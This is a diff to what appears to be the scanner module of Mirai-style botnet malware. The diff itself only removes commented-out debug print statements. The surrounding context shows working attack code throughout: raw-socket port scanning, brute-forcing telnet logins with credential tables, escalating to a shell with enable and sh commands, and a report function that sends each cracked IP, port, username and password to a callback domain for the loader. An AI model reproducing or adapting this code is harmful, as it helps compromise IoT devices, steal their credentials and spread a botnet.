@@ -79,19 +79,13 @@ void scanner_init(void)
 
     // Set up raw socket scanning and payload
     if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
-    {/*
-#ifdef DEBUG
-        printf("[scanner] Failed to initialize raw socket, cannot scan\n");
-#endif*/
+    {
         exit(0);
     }
     fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
     i = 1;
     if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
-    {/*
-#ifdef DEBUG
-        printf("[scanner] Failed to set IP_HDRINCL, cannot scan\n");
-#endif*/
+    {
         close(rsck);
         exit(0);
     }
@@ -242,11 +236,6 @@ void scanner_init(void)
 //#endif
     //--------  End Add new password  ------------
 
-/*
-#ifdef DEBUG
-    printf("[scanner] Scanner process initialized. Scanning started.\n");
-#endif
-*/
     // Main logic loop
     while (TRUE)
     {
@@ -345,10 +334,7 @@ void scanner_init(void)
 
             conn->dst_addr = iph->saddr;
             conn->dst_port = tcph->source;
-            setup_connection(conn);/*
-#ifdef DEBUG
-            printf("[scanner] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
-#endif*/
+            setup_connection(conn);
         }
 
         // Load file descriptors into fdsets
@@ -362,10 +348,7 @@ void scanner_init(void)
             timeout = (conn->state > SC_CONNECTING ? 30 : 5);
 
             if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
-            {/*
-#ifdef DEBUG
-                printf("[scanner] FD%d timed out (state = %d)\n", conn->fd, conn->state);
-#endif*/
+            {
                 close(conn->fd);
                 conn->fd = -1;
 
@@ -379,10 +362,7 @@ void scanner_init(void)
                     }
                     else
                     {
-                        setup_connection(conn);/*
-#ifdef DEBUG
-                        printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
-#endif*/
+                        setup_connection(conn);
                     }
                 }
                 else
@@ -429,16 +409,10 @@ void scanner_init(void)
                 {
                     conn->state = SC_HANDLE_IACS;
                     conn->auth = random_auth_entry();
-                    conn->rdbuf_pos = 0;/*
-#ifdef DEBUG
-                    printf("[scanner] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
-#endif*/
+                    conn->rdbuf_pos = 0;
                 }
                 else
-                {/*
-#ifdef DEBUG
-                    printf("[scanner] FD%d error while connecting = %d\n", conn->fd, err);
-#endif*/
+                {
                     close(conn->fd);
                     conn->fd = -1;
                     conn->tries = 0;
@@ -464,20 +438,14 @@ void scanner_init(void)
                     errno = 0;
                     ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                     if (ret == 0)
-                    {/*
-#ifdef DEBUG
-                        printf("[scanner] FD%d connection gracefully closed\n", conn->fd);
-#endif*/
+                    {
                         errno = ECONNRESET;
                         ret = -1; // Fall through to closing connection below
                     }
                     if (ret == -1)
                     {
                         if (errno != EAGAIN && errno != EWOULDBLOCK)
-                        {/*
-#ifdef DEBUG
-                            printf("[scanner] FD%d lost connection\n", conn->fd);
-#endif*/
+                        {
                             close(conn->fd);
                             conn->fd = -1;
 
@@ -489,10 +457,7 @@ void scanner_init(void)
                             }
                             else
                             {
-                                setup_connection(conn);/*
-#ifdef DEBUG
-                                printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
-#endif*/
+                                setup_connection(conn);
                             }
                         }
                         break;
@@ -509,10 +474,7 @@ void scanner_init(void)
                         case SC_HANDLE_IACS:
                             if ((consumed = consume_iacs(conn)) > 0)
                             {
-                                conn->state = SC_WAITING_USERNAME;/*
-#ifdef DEBUG
-                                printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);
-#endif*/
+                                conn->state = SC_WAITING_USERNAME;
                             }
                             break;
                         case SC_WAITING_USERNAME:
@@ -520,19 +482,12 @@ void scanner_init(void)
                             {
                                 send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
                                 send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
-                                conn->state = SC_WAITING_PASSWORD;/*
-#ifdef DEBUG
-                                printf("[scanner] FD%d received username prompt\n", conn->fd);
-#endif*/
+                                conn->state = SC_WAITING_PASSWORD;
                             }
                             break;
                         case SC_WAITING_PASSWORD:
                             if ((consumed = consume_pass_prompt(conn)) > 0)
-                            {/*
-#ifdef DEBUG
-                                printf("[scanner] FD%d received password prompt\n", conn->fd);
-#endif*/
-
+                            {
                                 // Send password
                                 send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                                 send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
@@ -545,11 +500,6 @@ void scanner_init(void)
                             {
                                 char *tmp_str;
                                 int tmp_len;
-/*
-#ifdef DEBUG
-                                printf("[scanner] FD%d received shell prompt\n", conn->fd);
-#endif
-*/
                                 // Send enable / system / shell / sh to session to drop into shell if needed
                                 table_unlock_val(TABLE_SCAN_ENABLE);
                                 tmp_str = table_retrieve_val(TABLE_SCAN_ENABLE, &tmp_len);
@@ -564,11 +514,7 @@ void scanner_init(void)
                             {
                                 char *tmp_str;
                                 int tmp_len;
-/*
-#ifdef DEBUG
-                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
-#endif
-*/
+
                                 table_unlock_val(TABLE_SCAN_SYSTEM);
                                 tmp_str = table_retrieve_val(TABLE_SCAN_SYSTEM, &tmp_len);
                                 send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
@@ -583,11 +529,7 @@ void scanner_init(void)
                             {
                                 char *tmp_str;
                                 int tmp_len;
-/*
-#ifdef DEBUG
-                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
-#endif
-*/
+
                                 table_unlock_val(TABLE_SCAN_SHELL);
                                 tmp_str = table_retrieve_val(TABLE_SCAN_SHELL, &tmp_len);
                                 send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
@@ -602,11 +544,7 @@ void scanner_init(void)
                             {
                                 char *tmp_str;
                                 int tmp_len;
-/*
-#ifdef DEBUG
-                                printf("[scanner] FD%d received enable prompt\n", conn->fd);
-#endif
-*/
+
                                 table_unlock_val(TABLE_SCAN_SH);
                                 tmp_str = table_retrieve_val(TABLE_SCAN_SH, &tmp_len);
                                 send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
@@ -621,11 +559,7 @@ void scanner_init(void)
                             {
                                 char *tmp_str;
                                 int tmp_len;
-/*
-#ifdef DEBUG
-                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
-#endif
-*/
+
                                 // Send query string
                                 table_unlock_val(TABLE_SCAN_QUERY);
                                 tmp_str = table_retrieve_val(TABLE_SCAN_QUERY, &tmp_len);
@@ -639,10 +573,7 @@ void scanner_init(void)
                         case SC_WAITING_TOKEN_RESP:
                             consumed = consume_resp_prompt(conn);
                             if (consumed == -1)
-                            {/*
-#ifdef DEBUG
-                                printf("[scanner] FD%d invalid username/password combo\n", conn->fd);
-#endif*/
+                            {
                                 close(conn->fd);
                                 conn->fd = -1;
 
@@ -654,19 +585,13 @@ void scanner_init(void)
                                 }
                                 else
                                 {
-                                    setup_connection(conn);/*
-#ifdef DEBUG
-                                    printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
-#endif*/
+                                    setup_connection(conn);
                                 }
                             }
                             else if (consumed > 0)
                             {
                                 char *tmp_str;
-                                int tmp_len;/*
-#ifdef DEBUG
-                                printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
-#endif*/
+                                int tmp_len;
                                 report_working(conn->dst_addr, conn->dst_port, conn->auth);
                                 close(conn->fd);
                                 conn->fd = -1;
@@ -708,10 +633,7 @@ static void setup_connection(struct scanner_connection *conn)
     if (conn->fd != -1)
         close(conn->fd);
     if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
-    {/*
-#ifdef DEBUG
-        printf("[scanner] Failed to call socket()\n");
-#endif*/
+    {
         return;
     }
 
@@ -968,10 +890,7 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
         return;
 
     if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
-    {/*
-#ifdef DEBUG
-        printf("[report] Failed to call socket()\n");
-#endif*/
+    {
         exit(0);
     }
 
@@ -980,10 +899,7 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
 
     entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_CB_DOMAIN, NULL));
     if (entries == NULL)
-    {/*
-#ifdef DEBUG
-        printf("[report] Failed to resolve report address\n");
-#endif*/
+    {
         return;
     }
     addr.sin_family = AF_INET;
@@ -995,10 +911,7 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
     table_lock_val(TABLE_SCAN_CB_PORT);
 
     if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
-    {/*
-#ifdef DEBUG
-        printf("[report] Failed to connect to scanner callback!\n");
-#endif*/
+    {
         close(fd);
         exit(0);
     }
@@ -1011,11 +924,7 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
     send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
     send(fd, &(auth->password_len), sizeof (uint8_t), MSG_NOSIGNAL);
     send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);
-/*
-#ifdef DEBUG
-    printf("[report] Send scan result to loader\n");
-#endif
-*/
+
     close(fd);
     exit(0);
 }
